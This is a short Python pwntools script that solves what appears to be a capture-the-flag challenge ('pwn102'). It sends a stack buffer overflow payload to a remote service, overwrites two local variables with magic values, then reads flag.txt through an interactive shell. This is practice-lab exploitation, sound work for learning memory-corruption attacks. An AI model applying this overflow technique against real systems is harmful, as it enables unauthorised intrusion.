#!/usr/bin/env python3
from pwn import *
import dotenv, os

dotenv.load_dotenv("../.env")
RHOST, RPORT = str(os.environ["RHOST"]), 9002

exe = ELF("./pwn102-1644307392479.pwn102")

context.binary = exe
# context.log_level = "debug"



def conn():
    # r = process([exe.path])
    r = remote(RHOST, RPORT)

    return r


def main():
    io = conn()

    payload = b'A' * 0x68           # padding to reach var_10
    payload += p32(0xc0d3)           # overwrite var_10
    payload += p32(0xc0ff33)
    io.sendlineafter(b"right?", payload)

    io.sendlineafter(b"c0d3", b"cat flag.txt")
    io.interactive()


if __name__ == "__main__":
    main()
